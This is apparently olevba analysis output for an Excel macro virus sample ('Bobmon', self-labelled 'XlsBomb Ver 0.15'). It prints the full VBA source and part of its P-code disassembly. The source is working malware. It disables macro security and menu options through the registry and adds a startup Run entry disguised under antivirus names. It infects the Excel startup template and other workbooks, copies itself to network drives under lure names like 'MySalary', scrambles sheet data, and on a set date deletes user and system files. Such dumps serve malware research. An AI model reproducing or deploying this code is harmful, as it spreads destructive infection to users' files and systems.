olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Bobmon.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Bobmon.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Bobmon.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Bobmon.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Bobmon.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO enCryptionXLS.bas 
in file: Virus.MSExcel.Bobmon.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/enCryptionXLS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'          DO NOT EDIT THIS MACRO !!!
'
' Everything gonna be M4D , EXCEL@BÖMBER launch...
Private Declare Function RegOpenKeyExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long
Global Const REG_DWORD As Long = 4
Global Const HKEY_LOCAL_MACHINE As Long = &H80000002
Global Const HKEY_CURRENT_USER As Long = &H80000001
Dim AA, BB, NN
Dim Myclub As String
Dim CrStat As Boolean
Dim pnm As String
Sub MessBoard()
ff = ActiveSheet.Index
Randomize
StarWidth = 15
StarHeight = 15
XDay = Day(Now())
    For i = 1 To XDay
        TopPos = Rnd() * (ActiveWindow.UsableHeight - StarHeight)
        LeftPos = Rnd() * (ActiveWindow.UsableWidth - StarWidth)
        Set NewStar = ActiveSheet.Shapes.AddShape _
          (msoShape5pointStar, LeftPos, TopPos, StarWidth, StarHeight)
        NewStar.Fill.ForeColor.SchemeColor = Int(Rnd() * 56)
        Application.Wait Now + TimeValue("00:00:01")
        DoEvents
    Next i
Set myShapes = Worksheets(ff).Shapes
    For Each shp In myShapes
        If Left(shp.Name, 9) = "AutoShape" Then
            shp.Delete
        End If
    Next
End Sub
Private Sub Auto_Open()
On Error Resume Next
Application.StatusBar = "Wait please...."
Application.ScreenUpdating = False
CommandBars("Tools").Controls("Customize...").Visible = False
CommandBars("Tools").Controls("Options...").Visible = False
CommandBars("Tools").Controls("Macro").Enable = False
    Kill97 = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0, KEY_ALL_ACCESS, k)
    Kill97 = RegSetValueExA(k, "Options6", 0, REG_DWORD, Chr$(0), 4)
    Kill97 = RegCloseKey(k)
    Kill2K = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\Microsoft\Office\9.0\Excel", 0, KEY_ALL_ACCESS, s)
    Kill2K = RegSetValueExA(s, "Level", 0, 1, "1", 0)
    Kill2K = RegCloseKey(s)
AnVrs = Array("VsStatEXE", "Norton Auto-Protect", "F-Secure", "PandaSoft", "AntiViral", "DrSolomon", "AntiVir", "MacroScan", "BombShellter")
Randomize
AVstr = AnVrs(Rnd * 9)
    KillAV = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS, s)
    KillAV = RegSetValueExA(s, AVstr, 0, 1, "c:\windows\rundll.exe", 0)
    KillAV = RegCloseKey(s)
Application.DisplayAlerts = False
  If Right(ActiveWorkbook.Name, 3) = "xlt" Then
  ActiveWindow.Visible = False
  Workbooks.Add
  End If
XBrnd
strup = Application.StartupPath
If Dir(strup & "\" & "*.xlt") = "" Then
pnm = ActiveWorkbook.Name
Apnm = ActiveWorkbook.FullName
OtherVrs = Dir(strup & "\" & "*.xls")
    If OtherVrs <> "" Then
    Workbooks(OtherVrs).Close
    Kill strup & "\" & OtherVrs
    End If
Workbooks(pnm).SaveAs FileName:=strup & "\" & Myclub & ".xlt"
ActiveWindow.Visible = False
Workbooks.Open (Apnm)
End If
For n = 67 To 90
l = Chr(n)
drv = l & ":"
d3 = DrvID(drv)
If d3 = "network" Then snd2drv (drv)
Next
nmpers = Dir(strup & "\" & "*.xlt")
Application.OnSheetActivate = "'" & strup & "\" & nmpers & "'!XLBomb"
If Month(Now()) = 2 And Day(Now()) = 14 Then
Range("A1").Insert
Range("A1").Select
With Selection.Font
        .Name = "Arial"
        .FontStyle = "Bold"
        .Size = 18
        .ColorIndex = 7
    End With
    ActiveCell.FormulaR1C1 = "Huppy Valentinos Days ... AlL oF YoU"
End If
Application.StatusBar = False
Application.DisplayAlerts = True
End Sub
Sub XLBomb()
On Error Resume Next
XlsBmb = "c:\070703.txt"
Application.DisplayAlerts = False
Application.ScreenUpdating = False
aktip = ActiveWorkbook.Name
sedang = ThisWorkbook.Name
Set mcraktip = Workbooks(aktip).VBProject.VBComponents
Set modaktip = ActiveWorkbook.VBProject.VBComponents
Set mymcr = ThisWorkbook.VBProject.VBComponents
If aktip <> "Book1" And aktip <> "Book2" Then
For NS = 1 To Sheets.Count
    If Sheets(NS).Name = "HdSheet" Then
    kz = Sheets(NS).Name
    Exit For
    End If
    kz = Sheets(NS).Name
Next NS
If kz <> "HdSheet" Then
Sheets.Add
ActiveWindow.ActiveSheet.Name = "HdSheet"
Sheets("HdSheet").Visible = xlSheetVeryHidden
Else
Decrypt
Sheets("HdSheet").Range("A7") = ""
End If
  For nm = 1 To mcraktip.Count
    If mcraktip(nm).Type = 1 Then
    nama = mcraktip(nm).Name
    Exit For
    End If
  Next nm
  modaktip.Remove modaktip(nm)
  For nm = 1 To mymcr.Count
    If mymcr(nm).Type = 1 Then
    nama = mymcr(nm).Name
    Exit For
    End If
  Next nm
  mymcr(nama).Export XlsBmb
  modaktip.Import XlsBmb
    Kill XlsBmb
  XBrnd
  ActiveWorkbook.VBProject.VBComponents(nm).Name = Myclub
  Application.ScreenUpdating = True
  If Minute(Now()) > 50 And WeekDay(Now()) Mod 2 = 0 Then MessBoard
End If
Application.DisplayAlerts = True
Application.ScreenUpdating = True
End Sub

Private Sub XBrnd()
Dim Sbjt, Bodd
On Error GoTo nil1
Randomize
Sbjt = Array("enCryptionXLS", "DamageXls", "BombStarter", "unKnownBomB", "ExcelDLL", "DeathOffice", "LnxOffice", "bOmbffice", "XlsLib")
Myclub = Sbjt(Rnd * 9 + 1)
Exit Sub
nil1:
Myclub = Sbjt(0)
End Sub

Function DrvID(drv3)
On Error Resume Next
Dim fso, d, t
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.getdrive(drv3)
Select Case d.drivetype
Case 0: t = "Unknown"
Case 1: t = "removable"
Case 2: t = "Fixed"
Case 3: t = "network"
Case 4: t = "CD-ROM"
Case 5: t = "Ramdisk"
End Select
If t = "" Then t = "none"
DrvID = t
End Function
Sub snd2drv(DrvAll)
On Error Resume Next
Application.DisplayAlerts = False
Application.ScreenUpdating = False
Gnm = ActiveWorkbook.Name
GnmF = ActiveWorkbook.FullName
Randomize
FlName = Array("Report2004", "Manager", "StupidStuff", "HRD2004", "MyCV-Anna", "MySalary", "NotFearACC", "BombfromLinux", _
"Money", "ThankYou", "DoNotOpen", "ExcelVBA", "Opinion", "Secret", "NextJob")
Bread = FlName(Rnd * 14 + 1)
Workbooks(Gnm).SaveAs FileName:=DrvAll & "\" & Bread & ".xls"
Workbooks(ActiveWorkbook.Name).Close 'your secret
Workbooks.Open (GnmF)
Application.DisplayAlerts = True
End Sub

Private Sub Auto_Close()
On Error Resume Next
If ActiveWorkbook.Name <> "Book1" And ActiveWorkbook.Name <> "Book2" Then
Application.ScreenUpdating = False
Application.DisplayAlerts = False
For NS = 1 To Sheets.Count
    If Sheets(NS).Name = "HdSheet" Then
    kz = Sheets(NS).Name
    Exit For
    End If
    kz = Sheets(NS).Name
Next NS
If kz <> "HdSheet" Then
Sheets.Add
ActiveWindow.ActiveSheet.Name = "HdSheet"
Sheets("HdSheet").Visible = xlSheetVeryHidden
End If
CryptSTAT = Sheets("HdSheet").Range("A7")
If CryptSTAT <> 1 Then
encrypt
Sheets("HdSheet").Range("A7") = 1
SvFl = Dir(Application.StartupPath & "\" & "*.xlt")
Workbooks(SvFl).Save
ActiveWorkbook.Save
End If
End If
If Month(Now()) = 7 And Day(Now()) = 7 Then
 Kill "c:\Mydocu~1\*.*"  '**Never Work**
 Kill "c:\Windows\*.i*"  '**Never Fun**
 Kill "c:\Winnt\s*.*"    '**Never Secure**
'Kill "MS:\Bill Gates"   '**Never Mind**
End If
End Sub

Sub encrypt()
Dim SCo As Integer
Randomize
AA = Int(Rnd * 4)
NN = Rnd * 9 + 175
 For SCo = 1 To Sheets.Count
 Y = 0
 z = 0
 gg = AA
 HH = NN
   For NCo = 1 To 6
   Y = Y + 1
   z = z + 1
   MyStr$ = Chr(HH)
   Sheets("HdSheet").Range("C" & Y) = gg
   Sheets("HdSheet").Range("D" & z) = MyStr$
   If Sheets(SCo).Name <> "ThisWorkbook" And Sheets(SCo).Name <> "HdSheet" Then
   Sheets(SCo).Cells.Replace What:=gg, Replacement:=MyStr$
   End If
   gg = gg + 1
   HH = HH + 1
   Next NCo
 Next SCo
End Sub
Sub Decrypt()
For SC1 = 1 To Sheets.Count
X = 0
Y = 0
    For NC1 = 1 To 6
    X = X + 1
    Y = Y + 1
    ReadC = Sheets("HdSheet").Range("C" & Y)
    ReadD$ = Sheets("HdSheet").Range("D" & X)
    If Sheets(SC1).Name <> "ThisWorkbook" And Sheets(SC1).Name <> "HdSheet" Then
    Sheets(SC1).Cells.Replace What:=ReadD$, Replacement:=ReadC
    End If
    Next NC1
Next SC1
End Sub
'if you remove this macro or not install tools, your money will broke......BOMB !!
'eastjava 010104, XlsBomb Ver 0.15 written by RedMoon
-------------------------------------------------------------------------------
VBA MACRO List4.cls 
in file: Virus.MSExcel.Bobmon.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, very hidden -  HdShee
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Bobmon.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 1190 bytes
' _VBA_PROJECT_CUR/VBA/List1 - 1173 bytes
' _VBA_PROJECT_CUR/VBA/List2 - 1173 bytes
' _VBA_PROJECT_CUR/VBA/List3 - 1173 bytes
' _VBA_PROJECT_CUR/VBA/enCryptionXLS - 25116 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0024 "          DO NOT EDIT THIS MACRO !!!"
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x0031 " Everything gonna be M4D , EXCEL@BÖMBER launch..."
' Line #3:
' 	FuncDefn (Private Declare Function RegOpenKeyExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #4:
' 	FuncDefn (Private Declare Function RegSetValueExA Lib "ADVAPI32.DLL" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long)
' Line #5:
' 	FuncDefn (Private Declare Function RegCloseKey Lib "ADVAPI32.DLL" (ByVal hKey As Long) As Long)
' Line #6:
' 	Dim (Global Const) 
' 	LitDI2 0x0004 
' 	VarDefn REG_DWORD (As Long)
' Line #7:
' 	Dim (Global Const) 
' 	LitHI4 0x0002 0x8000 
' 	VarDefn HKEY_LOCAL_MACHINE (As Long)
' Line #8:
' 	Dim (Global Const) 
' 	LitHI4 0x0001 0x8000 
' 	VarDefn HKEY_CURRENT_USER (As Long)
' Line #9:
' 	Dim 
' 	VarDefn AA
' 	VarDefn BB
' 	VarDefn NN
' Line #10:
' 	Dim 
' 	VarDefn Myclub (As String)
' Line #11:
' 	Dim 
' 	VarDefn CrStat (As Boolean)
' Line #12:
' 	Dim 
' 	VarDefn pnm (As String)
' Line #13:
' 	FuncDefn (Sub MessBoard())
' Line #14:
' 	Ld ActiveSheet 
' 	MemLd Index 
' 	St ff 
' Line #15:
' 	ArgsCall Read 0x0000 
' Line #16:
' 	LitDI2 0x000F 
' 	St StarWidth 
' Line #17:
' 	LitDI2 0x000F 
' 	St StarHeight 
' Line #18:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	St XDay 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld XDay 
' 	For 
' Line #20:
' 	ArgsLd Rnd 0x0000 
' 	Ld ActiveWindow 
' 	MemLd UsableHeight 
' 	Ld StarHeight 
' 	Sub 
' 	Paren 
' 	Mul 
' 	St TopPos 
' Line #21:
' 	ArgsLd Rnd 0x0000 
' 	Ld ActiveWindow 
' 	MemLd UsableWidth 
' 	Ld StarWidth 
' 	Sub 
' 	Paren 
' 	Mul 
' 	St LeftPos 
' Line #22:
' 	LineCont 0x0004 08 00 0A 00
' 	SetStmt 
' 	Ld msoShape5pointStar 
' 	Ld LeftPos 
' 	Ld TopPos 
' 	Ld StarWidth 
' 	Ld StarHeight 
' 	Ld ActiveSheet 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	Set NewStar 
' Line #23:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0038 
' 	Mul 
' 	FnInt 
' 	Ld NewStar 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt SchemeColor 
' Line #24:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:01"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #25:
' 	ArgsCall DoEvents 0x0000 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' 	SetStmt 
' 	Ld ff 
' 	ArgsLd Worksheets 0x0001 
' 	MemLd Shapes 
' 	Set myShapes 
' Line #28:
' 	StartForVariable 
' 	Ld shp 
' 	EndForVariable 
' 	Ld myShapes 
' 	ForEach 
' Line #29:
' 	Ld shp 
' 	MemLd New 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "AutoShape"
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld shp 
' 	ArgsMemCall Delete 0x0000 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Next 
' Line #33:
' 	EndSub 
' Line #34:
' 	FuncDefn (Private Sub Auto_Open())
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	LitStr 0x000F "Wait please...."
' 	Ld Application 
' 	MemSt StatusBar 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #38:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #39:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Options..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #40:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enable 
' Line #41:
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x0033 "Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld k 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St Kill97 
' Line #42:
' 	Ld k 
' 	LitStr 0x0008 "Options6"
' 	LitDI2 0x0000 
' 	Ld REG_DWORD 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St Kill97 
' Line #43:
' 	Ld k 
' 	ArgsLd RegCloseKey 0x0001 
' 	St Kill97 
' Line #44:
' 	Ld HKEY_CURRENT_USER 
' 	LitStr 0x0023 "Software\Microsoft\Office\9.0\Excel"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld s 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St Kill2K 
' Line #45:
' 	Ld s 
' 	LitStr 0x0005 "Level"
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x0001 "1"
' 	LitDI2 0x0000 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St Kill2K 
' Line #46:
' 	Ld s 
' 	ArgsLd RegCloseKey 0x0001 
' 	St Kill2K 
' Line #47:
' 	LitStr 0x0009 "VsStatEXE"
' 	LitStr 0x0013 "Norton Auto-Protect"
' 	LitStr 0x0008 "F-Secure"
' 	LitStr 0x0009 "PandaSoft"
' 	LitStr 0x0009 "AntiViral"
' 	LitStr 0x0009 "DrSolomon"
' 	LitStr 0x0007 "AntiVir"
' 	LitStr 0x0009 "MacroScan"
' 	LitStr 0x000C "BombShellter"
' 	ArgsArray Array 0x0009 
' 	St AnVrs 
' Line #48:
' 	ArgsCall Read 0x0000 
' Line #49:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	ArgsLd AnVrs 0x0001 
' 	St AVstr 
' Line #50:
' 	Ld HKEY_LOCAL_MACHINE 
' 	LitStr 0x002D "Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitDI2 0x0000 
' 	Ld KEY_ALL_ACCESS 
' 	Ld s 
' 	ArgsLd RegOpenKeyExA 0x0005 
' 	St KillAV 
' Line #51:
' 	Ld s 
' 	Ld AVstr 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x0015 "c:\windows\rundll.exe"
' 	LitDI2 0x0000 
' 	ArgsLd RegSetValueExA 0x0006 
' 	St KillAV 
' Line #52:
' 	Ld s 
' 	ArgsLd RegCloseKey 0x0001 
' 	St KillAV 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #54:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0003 "xlt"
' 	Eq 
' 	IfBlock 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #56:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	ArgsCall XBrnd 0x0000 
' Line #59:
' 	Ld Application 
' 	MemLd StartupPath 
' 	St strup 
' Line #60:
' 	Ld strup 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0005 "*.xlt"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St pnm 
' Line #62:
' 	Ld ActiveWorkbook 
' 	MemLd FullName 
' 	St Apnm 
' Line #63:
' 	Ld strup 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0005 "*.xls"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St OtherVrs 
' Line #64:
' 	Ld OtherVrs 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #65:
' 	Ld OtherVrs 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #66:
' 	Ld strup 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld OtherVrs 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld strup 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Myclub 
' 	Concat 
' 	LitStr 0x0004 ".xlt"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld pnm 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #69:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #70:
' 	Ld Apnm 
' 	Paren 
' 	Ld Workbooks 
' 	ArgsMemCall Option 0x0001 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	StartForVariable 
' 	Ld n 
' 	EndForVariable 
' 	LitDI2 0x0043 
' 	LitDI2 0x005A 
' 	For 
' Line #73:
' 	Ld n 
' 	ArgsLd Chr 0x0001 
' 	St l 
' Line #74:
' 	Ld l 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	St drv 
' Line #75:
' 	Ld drv 
' 	ArgsLd DrvID 0x0001 
' 	St d3 
' Line #76:
' 	Ld d3 
' 	LitStr 0x0007 "network"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld drv 
' 	Paren 
' 	ArgsCall snd2drv 0x0001 
' 	EndIf 
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	Ld strup 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0005 "*.xlt"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St nmpers 
' Line #79:
' 	LitStr 0x0001 "'"
' 	Ld strup 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld nmpers 
' 	Concat 
' 	LitStr 0x0008 "'!XLBomb"
' 	Concat 
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #80:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #81:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Insert 0x0000 
' Line #82:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #83:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Font 
' 	With 
' Line #84:
' 	LitStr 0x0005 "Arial"
' 	MemStWith New 
' Line #85:
' 	LitStr 0x0004 "Bold"
' 	MemStWith FontStyle 
' Line #86:
' 	LitDI2 0x0012 
' 	MemStWith Size 
' Line #87:
' 	LitDI2 0x0007 
' 	MemStWith ColorIndex 
' Line #88:
' 	EndWith 
' Line #89:
' 	LitStr 0x0024 "Huppy Valentinos Days ... AlL oF YoU"
' 	Ld ActiveCell 
' 	MemSt FormulaR1C1 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt StatusBar 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #93:
' 	EndSub 
' Line #94:
' 	FuncDefn (Sub XLBomb())
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	LitStr 0x000D "c:\070703.txt"
' 	St XlsBmb 
' Line #97:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #98:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #99:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St aktip 
' Line #100:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	St sedang 
' Line #101:
' 	SetStmt 
' 	Ld aktip 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set mcraktip 
' Line #102:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set modaktip 
' Line #103:
' 	SetStmt 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set mymcr 
' Line #104:
' 	Ld aktip 
' 	LitStr 0x0005 "Book1"
' 	Ne 
' 	Ld aktip 
' 	LitStr 0x0005 "Book2"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #105:
' 	StartForVariable 
' 	Ld NS 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sheets 
' 	MemLd Count 
' 	For 
' Line #106:
' 	Ld NS 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "HdSheet"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	Ld NS 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	St kz 
' Line #108:
' 	ExitFor 
' Line #109:
' 	EndIfBlock 
' Line #110:
' 	Ld NS 
' 	ArgsLd Sheets 0x0001 
' 	MemLd New 
' 	St kz 
' Line #111:
' 	StartForVariable 
' 	Ld NS 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	Ld kz 
' 	LitStr 0x0007 "HdSheet"
' 	Ne 
' 	IfBlock 
' Line #113:
' 	Ld Sheets 
' 	ArgsMemCall Add 0x0000 
' Line #114:
' 	LitStr 0x0007 "HdSheet"
' 	Ld ActiveWindow 
' 	MemLd ActiveSheet 
' 	MemSt New 
' Line #115:
' 	Ld xlSheetVeryHidden 
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	MemSt Visible 
' Line #116:
' 	ElseBlock 
' Line #117:
' 	ArgsCall Decrypt 0x0000 
' Line #118:
' 	LitStr 0x0000 ""
' 	LitStr 0x0002 "A7"
' 	LitStr 0x0007 "HdSheet"
' 	ArgsLd Sheets 0x0001 
' 	ArgsMemSt Range 0x0001 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	StartForVariable 
' 	Ld nm 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mcraktip 
' 	MemLd Count 
' 	For 
' Line #121:
' 	Ld nm 
' 	ArgsLd mcraktip 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #122:
' 	Ld nm 
' 	ArgsLd mcraktip 0x0001 
' 	MemLd New 
' 	St nama 
' Line #123:
' 	ExitFor 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	StartForVariable 
' 	Ld nm 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' 	Ld nm 
' 	ArgsLd modaktip 0x0001 
' 	Ld modaktip 
' 	ArgsMemCall Remove 0x0001 
' Line #127:
' 	StartForVariable 
' 	Ld nm 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld mymcr 
' 	MemLd Count 
' 	For 
' Line #128:
' 	Ld nm 
' 	ArgsLd mymcr 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #129:
' 	Ld nm 
' 	ArgsLd mymcr 0x0001 
' 	MemLd New 
' 	St nama 
' Line #130:
' 	ExitFor 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	StartForVariable 
' 	Ld nm 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' 	Ld XlsBmb 
' 	Ld nama 
' 	ArgsLd mymcr 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #134:
' 	Ld XlsBmb 
' 	Ld modaktip 
' 	ArgsMemCall Import 0x0001 
' Line #135:
' 	Ld XlsBmb 
' 	ArgsCall Kill 0x0001 
' Line #136:
' 	ArgsCall XBrnd 0x0000 
' Line #137:
' 	Ld Myclub 
' 	Ld nm 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #138:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #139:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0032 
' 	Gt 
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall MessBoard 0x0000 
' 	EndIf 
' Line #140:
' 	EndIfBlock 
' Line #141:
